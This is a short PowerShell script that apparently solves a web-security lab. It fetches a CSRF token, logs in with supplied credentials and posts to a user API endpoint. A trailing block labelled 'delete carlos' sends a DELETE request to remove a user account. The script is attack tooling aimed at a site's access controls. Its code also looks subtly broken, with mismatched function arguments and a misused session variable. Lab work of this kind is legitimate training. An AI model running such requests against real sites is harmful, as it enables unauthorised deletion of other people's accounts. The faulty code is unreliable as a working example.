param (
    [Parameter(Mandatory = $true)]
    [string]$server,
    [Parameter(Mandatory = $true)]
    [string]$username,
    [Parameter(Mandatory = $true)]
    [string]$password
)

if ($server.EndsWith("/")) {
    $server = $server.Substring(0, $server.Length - 1)
}

if ($server.startsWith("https://")) {
    
    $url = $server;
    $server = $server.Substring("https://".Length)
}
else {
    Write-Host `n"Wrong Server Format"`n
    exit
}
<#
if (-not (Get-Module -ErrorAction Ignore -ListAvailable PSParseHTML)) {
    Write-Verbose "Installing PSParseHTML module for the current user..."
    Install-Module -Scope CurrentUser PSParseHTML -ErrorAction Stop
}#>

function GetInputFieldValueByName {
    param (
        [Parameter(Mandatory = $true)]
        [string]$iwrResponse,
        [Parameter(Mandatory = $true)]
        [string]$FieldName
    )
    $csrf = $iwrResponse.InputFields.FindByName("csrf").Value;
    if (!$csrf) {
        write-host "CSRF Empty";
        exit
    }
    return $csrf
}

$commandurl = $url + "/login";

#get token to login
$response = iwr -URI $commandurl -SessionVariable $requestSession -Method Get -UseBasicParsing;  

#login
$data = @{ "csrf" = GetInputFieldValueByName($response); "username" = "$username"; "password" = "$password" } | ConvertTo-Json
$response = iwr -URI $commandurl -WebSession $requestSession -Method Post -Body $data; 


$commandurl = $url + "/api/user/$username";

$data = @{ "csrf" = GetInputFieldValueByName($response)} | ConvertTo-Json; 
$response = iwr -URI $commandurl -WebSession $requestSession -Method Post -Body $data;
$response.Content

exit
#delete carlos
$data = @{ "csrf" = GetInputFieldValueByName($response); "username" = "$username"; "password" = "$password" } | ConvertTo-Json
$response = iwr -URI $commandurl -WebSession $requestSession -Method Delete -Body $data; 

